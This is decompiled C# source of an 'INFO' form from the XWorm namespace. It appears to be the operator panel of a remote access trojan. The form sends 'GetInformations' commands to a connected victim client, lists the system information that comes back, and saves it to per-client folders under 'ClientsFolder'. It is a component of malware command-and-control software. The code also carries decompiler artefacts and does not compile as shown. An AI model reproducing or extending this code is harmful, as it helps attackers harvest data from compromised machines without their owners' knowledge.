using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x0200001C RID: 28
	[DesignerGenerated]
	public partial class INFO : Form
	{
		// Token: 0x060005F2 RID: 1522 RVA: 0x000360B1 File Offset: 0x000342B1
		public INFO()
		{
			base.Load += this.INFO_Load;
			base.FormClosing += this.INFO_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x17000236 RID: 566
		// (get) Token: 0x060005F5 RID: 1525 RVA: 0x000369CE File Offset: 0x00034BCE
		// (set) Token: 0x060005F6 RID: 1526 RVA: 0x000369D8 File Offset: 0x00034BD8
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000237 RID: 567
		// (get) Token: 0x060005F7 RID: 1527 RVA: 0x000369E1 File Offset: 0x00034BE1
		// (set) Token: 0x060005F8 RID: 1528 RVA: 0x000369EB File Offset: 0x00034BEB
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000238 RID: 568
		// (get) Token: 0x060005F9 RID: 1529 RVA: 0x000369F4 File Offset: 0x00034BF4
		// (set) Token: 0x060005FA RID: 1530 RVA: 0x00036A00 File Offset: 0x00034C00
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000239 RID: 569
		// (get) Token: 0x060005FB RID: 1531 RVA: 0x00036A43 File Offset: 0x00034C43
		// (set) Token: 0x060005FC RID: 1532 RVA: 0x00036A4D File Offset: 0x00034C4D
		internal virtual ImageList ImageList1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023A RID: 570
		// (get) Token: 0x060005FD RID: 1533 RVA: 0x00036A56 File Offset: 0x00034C56
		// (set) Token: 0x060005FE RID: 1534 RVA: 0x00036A60 File Offset: 0x00034C60
		internal virtual ListView ListView1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023B RID: 571
		// (get) Token: 0x060005FF RID: 1535 RVA: 0x00036A69 File Offset: 0x00034C69
		// (set) Token: 0x06000600 RID: 1536 RVA: 0x00036A73 File Offset: 0x00034C73
		internal virtual ColumnHeader ColumnHeader1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023C RID: 572
		// (get) Token: 0x06000601 RID: 1537 RVA: 0x00036A7C File Offset: 0x00034C7C
		// (set) Token: 0x06000602 RID: 1538 RVA: 0x00036A86 File Offset: 0x00034C86
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700023D RID: 573
		// (get) Token: 0x06000603 RID: 1539 RVA: 0x00036A8F File Offset: 0x00034C8F
		// (set) Token: 0x06000604 RID: 1540 RVA: 0x00036A9C File Offset: 0x00034C9C
		internal virtual ToolStripMenuItem ToolStripMenuItem4
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem4_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem4;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem4 = value;
				toolStripMenuItem = this._ToolStripMenuItem4;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700023E RID: 574
		// (get) Token: 0x06000605 RID: 1541 RVA: 0x00036ADF File Offset: 0x00034CDF
		// (set) Token: 0x06000606 RID: 1542 RVA: 0x00036AEC File Offset: 0x00034CEC
		internal virtual ToolStripMenuItem SaveToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._SaveToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem1_Click);
				ToolStripMenuItem saveToolStripMenuItem = this._SaveToolStripMenuItem1;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem1 = value;
				saveToolStripMenuItem = this._SaveToolStripMenuItem1;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000607 RID: 1543 RVA: 0x00036B2F File Offset: 0x00034D2F
		private void INFO_Load(object sender, EventArgs e)
		{
			this.Refresh();
		}

		// Token: 0x06000608 RID: 1544 RVA: 0x00036B3C File Offset: 0x00034D3C
		public new void Refresh()
		{
			this.ListView1.Items.Clear();
			this.ToolStripStatusLabel1.ForeColor = Color.Black;
			this.ToolStripStatusLabel1.Text = "Wait..";
			byte[] state = Helper.SB("GetInformations");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000609 RID: 1545 RVA: 0x00036BB0 File Offset: 0x00034DB0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600060A RID: 1546 RVA: 0x00036C08 File Offset: 0x00034E08
		private void INFO_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseInformations");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600060B RID: 1547 RVA: 0x00036B2F File Offset: 0x00034D2F
		private void ToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			this.Refresh();
		}

		// Token: 0x0600060C RID: 1548 RVA: 0x00036C48 File Offset: 0x00034E48
		private void SaveToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.ListView1.Items.Count > 0;
				if (flag)
				{
					string text = Path.Combine(Application.StartupPath, "ClientsFolder", this.CID, "Information");
					bool flag2 = !Directory.Exists(text);
					if (flag2)
					{
						Directory.CreateDirectory(text);
					}
					StringBuilder stringBuilder = new StringBuilder();
					try
					{
						foreach (object obj in this.ListView1.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							stringBuilder.Append(listViewItem.SubItems[0].Text);
							stringBuilder.Append(Environment.NewLine);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					StreamWriter streamWriter = new StreamWriter(text + "\\Information_" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".txt", false);
					streamWriter.WriteLine(stringBuilder.ToString());
					streamWriter.Close();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0400026E RID: 622
		public Client C;

		// Token: 0x0400026F RID: 623
		public string CID;
	}
}
